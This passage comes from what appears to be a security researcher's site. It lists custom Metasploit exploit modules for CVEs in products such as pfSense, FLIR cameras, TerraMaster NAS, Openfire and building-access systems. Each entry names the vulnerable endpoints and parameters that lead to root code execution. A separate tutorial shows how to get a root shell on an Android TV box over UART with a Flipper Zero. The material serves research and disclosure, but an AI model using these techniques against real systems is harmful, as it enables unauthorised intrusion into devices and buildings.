# cp pfsense_pfblockerng_rce_cve_2022_31814.rb ~/.msf4/modules/exploits/unix/http/
# msfconsole
msf6> reload_all
```
**UPDATE October 14, 2022:**<br />
Similar module is now available at the main stream of Metasploit.

`exploit/unix/http/pfsense_pfblockerng_webshell`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-155](https://www.rapid7.com/blog/post/2022/10/14/metasploit-wrap-up-155/)

### flir_ax8_unauth_rce_cve_2022_37061.rb
FLIR AX8 is affected by an unauthenticated remote command injection vulnerability.

FLIR AX8 is a thermal sensor with imaging capabilities, combining thermal and visual cameras that provides continuous temperature monitoring and alarming for critical electrical and mechanical equipment.

All FLIR AX8 thermal sensor cameras versions up to and including `1.46.16` are vulnerable to Remote Command Injection.<br />
This can be exploited to inject and execute arbitrary shell commands as the root user through the id HTTP POST parameter in the `res.php` endpoint.
This module uses the vulnerability to upload and execute payloads gaining root privileges.

**Installation:**
```console
# cp flir_ax8_unauth_rce_cve_2022_37061.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE November 4, 2022:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/flir_ax8_unauth_rce_cve_2022_37061`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-182](https://www.rapid7.com/blog/post/2022/11/04/metasploit-weekly-wrap-up-182/)

### vmware_nsxmgr_xstream_rce_cve_2021_39144.rb
VMware Cloud Foundation (NSX-V) contains a remote code execution vulnerability via XStream open source library.<br />
Due to an unauthenticated endpoint that leverages XStream for input serialization in VMware Cloud Foundation (NSX-V), a malicious actor can get remote code execution in the context of `root` on the appliance.<br />
VMware Cloud Foundation `3.x` and more specific NSX Manager Data Center for vSphere up to and including version `6.4.13` are vulnerable to Remote Command Injection.<br /><br />
This module exploits the vulnerability to upload and execute payloads gaining root privileges.

**Installation:**
```console
# cp vmware_nsxmgr_xstream_rce_cve_2021_39144.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE November 18, 2022:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/vmware_nsxmgr_xstream_rce_cve_2021_39144`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-184](https://www.rapid7.com/blog/post/2022/11/18/metasploit-weekly-wrap-up-184/)

### linear_emerge_unauth_rce_cve_2019_7256.rb
Nortek Security & Control, LLC (NSC) is a leader in wireless security, home automation and personal safety systems and devices.
The eMerge E3-Series is part of Linear’s access control platform, that delivers entry-level access control to buildings.<br />
It is a web based application where the HTTP web interface is typically exposed to the public internet.<br />

The Linear eMerge E3-Series with firmware versions `1.00-06` and below are vulnerable to an unauthenticated command injection remote root exploit that leverages card_scan_decoder.php.<br />
This can be exploited to inject and execute arbitrary shell commands as the root user through the No and door HTTP GET parameter.<br />
A successful exploit could allow the attacker to execute arbitrary commands on the underlying operating system with the root privileges.<br />

Building automation and access control systems are at the heart of many critical infrastructures, and their security is vital.<br />
Executing attacks on these systems may enable unauthenticated attackers to access and manipulate doors, elevators, air-conditioning systems, cameras, boilers, lights, safety alarm systems within a building.<br />

This issue affects all Linear eMerge E3 versions up to and including `1.00-06`.<br />

**Installation:**
```console
# cp linear_emerge_unauth_rce_cve_2019_7256.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE January 06, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/linear_emerge_unauth_rce_cve_2019_7256`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-4](https://www.rapid7.com/blog/post/2023/01/06/metasploit-weekly-wrap-up-4/)

### ivanti_csa_unauth_rce_cve_2021_44529.rb
This module exploits a command injection vulnerability in the Ivanti Cloud Services Appliance (CSA)for Ivanti Endpoint Manager.<br />
A cookie based code injection vulnerability in the Cloud Services Appliance before `4.6.0-512` allows an unauthenticated user
to execute arbitrary code with limited permissions.<br />
Successful exploitation results in command execution as the `nobody` user.<br />

**Installation:**
```console
# cp ivanti_csa_unauth_rce_cve_2021_44529.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE January 20, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/ivanti_csa_unauth_rce_cve_2021_44529.rb`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-189](https://www.rapid7.com/blog/post/2023/01/20/metasploit-weekly-wrap-up-189/)

### control_web_panel_unauth_rce_cve_2022_44877.rb
This module exploits a remote command execution vulnerability in the Control Web Panel (CWP) application.<br />
The vulnerability allows an unauthenticated user to execute arbitrary code by using a special POST login request
that creates a failed login entry in the `/var/log/cwp.log` using double quotes.<br />
The vulnerable endpoint is the admin login `/login/index.php?login=` which typically runs on port `2030` or `2086` for `http` and
port `2031` and port `2087` for `https`. Successful exploitation results in command execution as the `root` user.<br />
CWP versions `0.9.8.1146` and below are vulnerable.

**Installation:**
```console
# cp control_web_panel_unauth_rce_cve_2022_44877.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
### sugarcrm_webshell_cve_2023_22952.rb
This module exploits a Remote Code Execution vulnerability that has been identified in the SugarCRM application.<br />
Using a specially crafted request, custom PHP code can be uploaded and injected through the EmailTemplates because of missing input validation.
Any user privileges can exploit this vulnerability and it results in access to the underlying operating system with the same privileges
under which the web services run (typically user www-data).
SugarCRM 11.0 Professional, Enterprise, Ultimate, Sell and Serve versions `11.0.4` and below are affected. Fixed in release `11.0.5`.<br />
SugarCRM 12.0 Enterprise, Sell and Serve versions `12.0.1` and below are affected. Fixed in release `12.0.2`.<br />

**Installation:**
```console
# cp sugarcrm_webshell_cve_2023_22952.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE March 10, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/multi/http/sugarcrm_webshell_cve_2023_22952.rb`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-196](https://www.rapid7.com/blog/post/2023/03/10/metasploit-weekly-wrap-up-196/)

### optergy_bms_backdoor_rce_cve_2019_7276.rb
This module exploits an undocumented backdoor vulnerability in the Optergy Proton and Enterprise Building Management System (BMS) applications.
Versions `2.0.3a` and below are vulnerable.
Attackers can exploit this issue by directly navigating to an undocumented backdoor script called `Console.jsp` in the tools directory and gain full system access.
Successful exploitation results in `root` command execution using `sudo` as user `optergy`.

**Installation:**
```console
# cp optergy_bms_backdoor_rce_cve_2019_7276.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE March 31, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/optergy_bms_backdoor_rce_cve_2019_7276.rb`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-198](https://www.rapid7.com/blog/post/2023/03/31/metasploit-weekly-wrap-up-198/)

### bash_env_cgi_rce.rb
This module exploits the Shellshock vulnerability, a flaw in how the Bash shell handles external environment variables.
This module targets CGI scripts in web servers by setting the `HTTP_USER_AGENT` environment variable to a malicious function definition.

**Installation:**
```console
# cp bash_env_cgi_rce.rb ~/.msf4/modules/exploits/multi/http/
# msfconsole
msf6> reload_all
```
### terramaster_unauth_rce_cve_2020_35665.rb a.k.a. TerrorMaster 1
This module is exploiting a vulnerability described in [CVE-2020-35665](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-35665) or [CVE-2020-28188](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28188) that allows an unauthenticated attacker to upload a webshell via shell metacharacters in the `Event` parameter using the vulnerable endpoint `include/makecvs.php` during the `CSV` creation process.
See this [AttackerKB Article](https://attackerkb.com/topics/lXY4yjOvwx/cve-2020-35665) for more details.

Because of this, any remote attacker, regardless of authentication, can exploit this vulnerability to gain access to the underlying operating system as the user that the web services are running as (typically `root` in case of TerraMaster).

**Installation:**
```console
# cp terramaster_unauth_rce_cve_2020_35665.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
### terramaster_unauth_rce_cve_2021_45837.rb a.k.a. TerrorMaster 2
This module provides a Terramaster chained exploit that performs session crafting to achieve escalated privileges that allows an attacker to access vulnerable code execution flaws.
TOS versions `4.2.15` and below  are affected. 

[CVE-2021-45839](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45839) is exploited to obtain the first administrator's hash set up on the system as well as other information such as MAC address, by performing a `POST` request to the `/module/api.php?mobile/webNasIPS` endpoint.
This information is used to craft an unauthenticated admin session using [CVE-2021-45841](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45841) where an attacker can self-sign session cookies by knowing the target MAC address and the user password hash.
Guest users (disabled by default) can be abused using a null/empty hash and allow an unauthenticated attacker to login as guest which is used to download the `/etc/group` info to obtain the list of admin users, used to establish an unauthenticated admin session thru session crafting.

Finally, [CVE-2021-45837](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-45837) is exploited to execute arbitrary commands as root by sending a specifically crafted input to vulnerable endpoint `/tos/index.php?app/del`.
See this [AttackerKB Article](https://attackerkb.com/topics/8rNXrrjQNy/cve-2021-45837) for more details.

**Installation:**
```console
# cp terramaster_unauth_rce_cve_2021_45837.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
### terramaster_unauth_rce_cve_2022_24990.rb a.k.a. TerrorMaster 3
This module exploits an unauthenticated remote code execution vulnerability in TerraMaster TOS `4.2.29` and lower by chaining two existing vulnerabilities, [CVE-2022-24990: Leaking sensitive information](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24990) and [CVE-2022-24989: Authenticated remote code execution](https://www.redpacketsecurity.com/terramaster-tos-command-execution-cve-2022-24989/).
Exploiting vulnerable endpoint `api.php?mobile/webNasIPS` leaking sensitive information such as admin password hash and mac address, the attacker can achieve unauthenticated access and use another vulnerable endpoint `api.php?mobile/createRaid` with POST parameters `raidtype` and `diskstring` to upload a webshell and execute remote code as root on TerraMaster NAS devices.

See this [AttackerKB Article](https://attackerkb.com/topics/h8YKVKx21t/cve-2022-24990) for more details.

**Installation:**
```console
# cp terramaster_unauth_rce_cve_2022_24990.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE Jue 16, 2023:**<br />
All TerraMaster modules have been added to the main stream of Metasploit and are now available under same the module names.

See also [Metasploit-weekly-wrap-up-15](https://www.rapid7.com/blog/post/2023/06/16/metasploit-weekly-wrap-up-15/)

### openfire_auth_bypass_rce_cve_2023_32315.rb
`Openfire's` administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment using the path `http://localhost:9090/setup/setup-s/%u002e%u002e/%u002e%u002e/`. 
Endpoints such as `log.jsp`, `user-groups.jsp` and `user-create.jsp` can be used to gain unauthorized admin access.
It allows an unauthenticated user to use the unauthenticated `Openfire` Setup Environment in an already configured `Openfire` environment to access restricted pages in the `Openfire Admin Console` reserved for administrative users.

This module will use the vulnerability to create a new admin user that will be used to upload a `Openfire` management plugin weaponized with a `Java` native payload that triggers an RCE.
The vulnerability affects all versions of `Openfire` that have been released since April 2015, starting with version `3.10.0`.
The problem has been patched in `Openfire` release `4.7.5` and `4.6.8`, and further improvements will be included in the first version on the `4.8` branch, which is version `4.8.0`.

See this [AttackerKB Article](https://attackerkb.com/topics/7Tf5YGY3oT/cve-2023-32315) for more details.

**Installation:**
```console
# cp openfire_auth_bypass_rce_cve_2023_32315.rb ~/.msf4/modules/exploits/multi/http/
# msfconsole
msf6> reload_all
```
**UPDATE July 21, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/multi/http/openfire_auth_bypass_rce_cve_2023_32315`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-20](https://www.rapid7.com/blog/post/2023/07/21/metasploit-weekly-wrap-up-20/)

### wp_plugin_fma_shortcode_unauth_rce.rb
The Wordpress plugin does not adequately prevent uploading files with disallowed MIME types when using the shortcode.
This leads to RCE in cases where the allowed MIME type list does not include PHP files.
In the worst case, this is available to unauthenticated users, but is also works in an authenticated configuration.
File Manager Advanced Shortcode plugin version `2.3.2` and lower are vulnerable.
To install the Shortcode plugin File Manager Advanced version `5.0.5` or lower is required to keep the configuration vulnerable. 
Any user privileges can exploit this vulnerability which results in access to the underlying operating system with the same privileges under which the Wordpress web services run.

See this [AttackerKB Article](https://attackerkb.com/topics/JncRCWZ5xm/cve-2023-2068) for more details.

**Installation:**
```console
# cp wp_plugin_fma_shortcode_unauth_rce.rb ~/.msf4/modules/exploits/multi/http/
# msfconsole
msf6> reload_all
```
**UPDATE July 28, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/multi/http/wp_plugin_fma_shortcode_unauth_rce`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-21](https://www.rapid7.com/blog/post/2023/07/28/metasploit-weekly-wrap-up-21/)

### chamilo_unauth_rce_cve_2023_34960.rb
`Chamilo` is an e-learning platform, also called Learning Management Systems (LMS).
This module exploits an unauthenticated remote command execution vulnerability that affects `Chamilo` versions `1.11.18` and below.
See also [CVE-2023-34960](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-34960). 
Due to a functionality called `Chamilo Rapid` to easily convert PowerPoint slides to courses on `Chamilo`, it is possible for an unauthenticated remote attacker to execute arbitrary commands at OS level using a malicious SOAP request at the vulnerable endpoint `/main/webservices/additional_webservices.php`.

Read this [article](https://attackerkb.com/topics/VVJpMeSpUP/cve-2023-34960) on attackerkb.com for more details.

**Installation:**
```console
# cp chamilo_unauth_rce_cve_2023_34960.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE August 25, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/chamilo_unauth_rce_cve_2023_34960`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-24](https://www.rapid7.com/blog/post/2023/08/25/metasploit-weekly-wrap-up-24/)

### solarview_unauth_rce_cve_2023_23333.rb
[SolarView Compact](https://www.contec.com/products-services/environmental-monitoring/solarview/) has a vulnerability that allows remote code execution on a vulnerable `SolarView Compact` device by bypassing internal restrictions through the vulnerable endpoint `downloader.php` using the `file` parameter. 
Firmware versions up to `v6.33` are vulnerable.

Read this [article](https://attackerkb.com/topics/kE3lzTZGV2/cve-2023-23333) on attackerkb.com for more details.

**Installation:**
```console
# cp solarview_unauth_rce_cve_2023_23333.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE September 08, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/solarview_unauth_rce_cve_2023_23333`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-26](https://www.rapid7.com/blog/post/2023/09/08/metasploit-weekly-wrap-up-26/)

### totolink_unauth_rce_cve_2023_30013.rb
TOTOLINK X5000R Wireless Gigabit Router firmware `X5000R_V9.1.0u.6118_B20201102` contains a command insertion vulnerability in `setting/setTracerouteCfg`.
This vulnerability allows an attacker to execute arbitrary commands through the "command" parameter.
After exploitation, an attacker will have full access with the same user privileges under which the webserver is running (typically as user `root`;-).

Read this [article](https://attackerkb.com/topics/xnX3I3PEgM/cve-2023-30013) on attackerkb.com for more details.

**Installation:**
```console
# cp totolink_unauth_rce_cve_2023_30013.rb ~/.msf4/modules/exploits/linux/http/
# msfconsole
msf6> reload_all
```
**UPDATE September 22, 2023:**<br />
This module has been added to the main stream of Metasploit and is now available under the module name:

`exploit/linux/http/totolink_unauth_rce_cve_2023_30013`{: style="color: lime"}

See also [Metasploit-weekly-wrap-up-28](https://www.rapid7.com/blog/post/2023/09/22/metasploit-weekly-wrap-up-28/)

<!-- END LEGACY SOURCE: _pages/module-development.md -->

---

## _posts/2024-08-26-howto-uart-shell.md

**Title:** How to spawn an UART shell?

**Legacy permalink:** not explicitly defined

<!-- BEGIN LEGACY SOURCE: _posts/2024-08-26-howto-uart-shell.md -->

---
title:  "How to spawn an UART shell?"
---
Hacking IoT hardware to find exploits is fun but can be challenging if you do not have access to the Firmware.<br />
Using Firmware emulation allows you to gain access to the firmware without having the hardware in hand.
But if you have access to the IoT hardware, the other way to gain access is to detect and spawn an UART shell.<br />
In my article [Spawning UART shells](/iot-uart-shell/ "Spawning UART shells"), I explain how to do this using a Flipper Zero.

Happy reading!

<!-- END LEGACY SOURCE: _posts/2024-08-26-howto-uart-shell.md -->

---

## _pages/iot-uart-shell.md

**Title:** <span style="color:lime">IoT Hacking - Spawning UART shells</span>

**Legacy permalink:** `/iot-uart-shell/`

<!-- BEGIN LEGACY SOURCE: _pages/iot-uart-shell.md -->

---
title: <span style="color:lime">IoT Hacking - Spawning UART shells</span>
permalink: /iot-uart-shell/
author_profile: false
categories:
  - IoT Hacking
tags:
  - IoT
  - UART
  - shell
sidebar:
  - title: ""
    image: /assets/images/linux-shell-code.png
transpeed-6k:
  - url: /assets/images/transpeed-6k.png
    image_path: /assets/images/transpeed-6k.png
    alt: "Transpeed 6K Ultra HD TV Box"
    title: "Transpeed 6K Ultra HD TV Box"
  - url: /assets/images/pcb-transpeed-6k.png
    image_path: /assets/images/pcb-transpeed-6k.png
    alt: "UART Transpeed 6K Ultra HD"
    title: "UART Transpeed 6K Ultra HD"
uart-flipper-setup:
  - url: /assets/images/uart-diagram.png
    image_path: /assets/images/uart-diagram.png
    alt: "UART connection diagram"
    title: "UART connection diagram"
  - url: /assets/images/uart-test-bed.png
    image_path: /assets/images/uart-test-bed.jpg
    alt: "UART Flipper Zero test bed"
    title: "UART test bed"
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---
## Introduction
Hacking IoT devices to identify vulnerablities using UART is a common way to gain access to the IoT device when you have physical access to the device.
UART stands for universal asynchronous receiver / transmitter and defines a protocol, or set of rules, for exchanging serial data between two devices.
UART is very simple and only uses two wires between transmitter and receiver to transmit and receive in both directions.
Both ends also have a ground connection. 

Allmost all IoT hardware have the UART functionality onboard, because it is used for debug purposes. To identify the UART interfac and ports, you will need to open the device
to gain access to the process circuit board (PCB) and UART interface.

## Identifying UART Ports
UART has 4 ports: `TX`(Transmit), `RX`(Receive), `VCC`(Voltage), and `GND`(Ground). You might be able to find 4 ports with the TX and RX letters written in the PCB.
But if there is no indication, you might need to try to find them yourself using a multimeter or a logic analyzer.

With a multimeter and the device powered off:

+ To identify the `GND` pin
{: style="color: lime"}
Use the Continuity Test mode, place the back lead into ground and test with the red one until you hear a sound from the multimeter.
Several `GND` pins can be found the PCB, so you might have found or not the one belonging to UART.
+ To identify the `VCC` port
{: style="color: lime"}
Set the DC voltage mode and set it up to 20 V of voltage. Black probe on ground and red probe on the pin. Power on the device.
If the multimeter measures a constant voltage of either 3.3 V or 5 V, you’ve found the `VCC` pin. If you get other voltages, retry with other ports.
+ To identify the `TX` port
{: style="color: lime"}
DC voltage mode up to 20 V of voltage, black probe on ground, and red probe on the pin, and power on the device.
If you find the voltage fluctuates for a few seconds and then stabilizes at the Vcc value, you’ve most likely found the `TX` port.
This is because when powering on, it sends some debug data.
+ The `RX` port would be the closest one to the other 3
{: style="color: lime"}
It has the lowest voltage fluctuation and lowest overall value of all the UART pins.

## Getting an UART shell on the Transpeed 6K Ultra HD TV Box
Let's do a quick demonstration how to get an UART shell running on a Transpeed 6K Ultra HD TV Box.
You will need a Transpeed Ultra 6K device, a multimeter and I am using a Flipper Zero device to setup an UART bridge between the IoT device and my Macbook Pro.

<span style="color:yellow"><i class="fa fa-info-circle"></i></span>
[The Flipper Zero](https://flipperzero.one/) is a portable multi-functional device developed for interaction with access control systems with a curious personality of a cyber-dolphin.
The device is able to read, copy, and emulate RFID and NFC tags, radio remotes, iButton, and digital access keys, along with a GPIO interface.
The idea of Flipper Zero is to combine all the hardware tools you'd need for exploration and development on the go.
{: .notice--info}

### Finding the UART Interface on the Transpeed 6K Ultra HD
The Transpeed 6K Ultra HD is a low-end TV Box running Android V10 with a Quad Core with ARM Cortex-A53 processors.
After opening the device (remove the four plastic buttons at the bottom to acces the screws and unscrew the box), you can detach the PCB and check for the UART interface.

In this case, is it rather simple to identiy the UART interface because the `RX` and `TX` ports are marked on the board (see **red**{: style="color: red"} rectangle)
which makes the testing of the ports with the multimeter redundant.
{% include gallery id="transpeed-6k" caption="_Transpeed 6K Ultra HD TV Box_" %}

### Spawning a Shell
Now that we have identified the UART interface, you can connect the UART ports `RX`, `TX` and `GND` to your Flipper Zero as indicated on the diagram below.
Connect your Flipper Zero to your Macbook Pro or other PC with USB and select GPIO->USB-UART Bridge option and set the baudrate to 115200, 8 bits, no partity and 1 stopbit.
{% include gallery id="uart-flipper-setup" caption="_UART Flipper Zero Setup_" %}
Use `minicom` or `screen` to configure the serial device interface on your Macbook. 
Please ensure that you use the same baudrate settings and select the flipper serial device.<br />
In my case the serial device is named `/dev/tty.usbmodemflip_On71nere1`{: style="color: lime"}.
```shell
╭─ ~ ·······························································································································  2m 53s  09:58:36
╰─❯ minicom -s
    +-----------------------------------------------------------------------+
    | A -    Serial Device      : /dev/tty.usbmodemflip_On71nere1           |
    | B - Lockfile Location     : /usr/local/Cellar/minicom/2.9/var         |
    | C -   Callin Program      :                                           |
    | D -  Callout Program      :                                           |
    | E -    Bps/Par/Bits       : 115200 8N1                                |
    | F - Hardware Flow Control : No                                        |
    | G - Software Flow Control : No                                        |
    | H -     RS485 Enable      : No                                        |
    | I -   RS485 Rts On Send   : No                                        |
    | J -  RS485 Rts After Send : No                                        |
    | K -  RS485 Rx During Tx   : No                                        |
    | L -  RS485 Terminate Bus  : No                                        |
    | M - RS485 Delay Rts Before: 0                                         |
    | N - RS485 Delay Rts After : 0                                         |
    |                                                                       |
    |    Change which setting?                                              |
    +-----------------------------------------------------------------------+
```
Start `minicom` and power on the Transpeed 6K Ultra HD device. You will see a lot of boot messages and at some point you will be able to enter a shell.
In my case, boot messages kept coming and I had to adjust the debug level with the command `dmesg -n 1` to silence the console.<br />
If you have garbled output please check that your UART ports are connected properly according to the UART connection diagram listed above.
Do not forget the `GND` pins and check your baudrate settings on both sides (minicom and Flipper Zero).
```shell
╭─ ~ ·······························································································································  2m 53s  09:58:36
╰─❯ minicom
... Lot of boot messages ...
[   85.826256] type=1400 audit(1654132468.583:93): avc: denied { open } for comm="d.process.media" path="/dev/gsm" dev="tmpfs" ino=1222 scontext=u:r:mediaprovider:s0:c512,c768 tcontext=u:object_r:device:a
[   85.827383] type=1400 audit(1654132468.720:94): avc: denied { read write } for comm="ocess.gservices" name="gsm" dev="tmpfs" ino=1222 scontext=u:r:priv_app:s0:c512,c768 tcontext=u:object_r:device:s0 ts
[   85.827634] type=1400 audit(1654132468.720:94): avc: denied { read write } for comm="ocess.gservices" name="gsm" dev="tmpfs" ino=1222 scontext=u:r:priv_app:s0:c512,c768 tcontext=u:object_r:device:s0 ts
[   85.829174] type=1400 audit(1654132468.720:95): avc: denied { open } for comm="ocess.gservices" path="/dev/gsm" dev="tmpfs" ino=1222 scontext=u:r:priv_app:s0:c512,c768 tcontext=u:object_r:device:s0 tcs
[   85.830396] type=1400 audit(1654132468.720:95): avc: denied { open } for comm="ocess.gservices" path="/dev/gsm" dev="tmpfs" ino=1222 scontext=u:r:priv_app:s0:c512,c768 tcontext=u:object_r:device:s0 tcs
[   85.830437] type=1400 audit(1654132468.720:96): avc: denied { write } for comm="logcat" path="pipe:[7443]" dev="pipefs" ino=7443 scontext=u:r:logpersist:s0 tcontext=u:r:init:s0 tclass=fifo_file permis1
[   85.955431] fd650_time_check_cb for fd650, auto time:1, boot completed:1
[   85.983598] gsm_dev_llseek called!
[   85.987478] gsm_dev_llseek new offset:512!
[   85.992193] gsm_dev_release gsm_dev_release
[   86.669497] binder: undelivered transaction 39761, process died.
[   86.677417] binder_alloc: 5378: binder_alloc_buf, no vma
[   86.683701] binder: 2109:3428 transaction failed 29189/-3, size 100-8 line 3235
[   86.982106] fd650_time_check_cb for fd650, auto time:1, boot completed:1
console:/ $
console:/ $ whoami
shell
console:/ $ su
console:/ # uname -a
Linux localhost 4.9.170 #76 SMP PREEMPT Mon May 30 13:44:11 CST 2022 armv8l
console:/ # whoami
root
console:/ # df
Filesystem            1K-blocks    Used Available Use% Mounted on
tmpfs                    749960     628    749332   1% /dev
tmpfs                    749960       0    749960   0% /mnt
tmpfs                    749960       0    749960   0% /apex
/dev/block/mmcblk0p11     11760      72     11688   1% /metadata
/dev/block/dm-0         1882332 1876612      5720 100% /
/dev/block/dm-1          141556  141120       436 100% /vendor
/dev/block/dm-2           55324   55152       172 100% /product
/dev/block/mmcblk0p17  19046724 3451080  15595644  19% /data
/dev/block/mmcblk0p7    1257344  103288   1154056   9% /cache
/dev/block/mmcblk0p16     16334       2     16332   1% /Reserve0
/data/media            19046724 3451080  15595644  19% /mnt/runtime/default/emulated
console:/ #
```
You can do this trick with a lot of IoT hardware as long as the UART interface is available and not disabled in the kernel.
In some cases, the vendor disconnects the UART interface on the board itself by cutting the circuits.<br /><br />
Also check out this [blog](https://alrikrr.github.io/flipperzero-uart-bridge-rpi4-to-flipper/) where you can do the same with a Raspberry PI.

<!-- END LEGACY SOURCE: _pages/iot-uart-shell.md -->

---

## _pages/references.md

**Title:** References

**Legacy permalink:** `/references/`

<!-- BEGIN LEGACY SOURCE: _pages/references.md -->

---
title: References
permalink: /references/
---

[(1) Metasploit Framework Tutorial](https://nooblinux.com/metasploit-tutorial/ "Metasploit Framework Tutorial")

[(2) Metasploit Basics](https://null-byte.wonderhowto.com/how-to/metasploit-basics/ "Metasploit Basics")

[(3) Google Hacking DB](https://www.exploit-db.com/google-hacking-database "Google Hacking Database")

<!-- END LEGACY SOURCE: _pages/references.md -->

---

## _pages/log4shell.md

**Title:** <span style="color:lime">Log4shell Attacks</span>

**Legacy permalink:** `/log4shell/`

<!-- BEGIN LEGACY SOURCE: _pages/log4shell.md -->

---
title: <span style="color:lime">Log4shell Attacks</span>
permalink: /log4shell/
author_profile: false
categories:
  - log4shell
  - Tips
  - Tricks
tags:
  - log4shell
  - exploits
  - MSF
sidebar:
  - title: ""
    image: /assets/images/log4shell.png
toc: true
toc_label: "Table of Contents"
toc_icon: "folder"
toc_sticky: true
---

## Under Construction

This page is under construction

<!-- END LEGACY SOURCE: _pages/log4shell.md -->

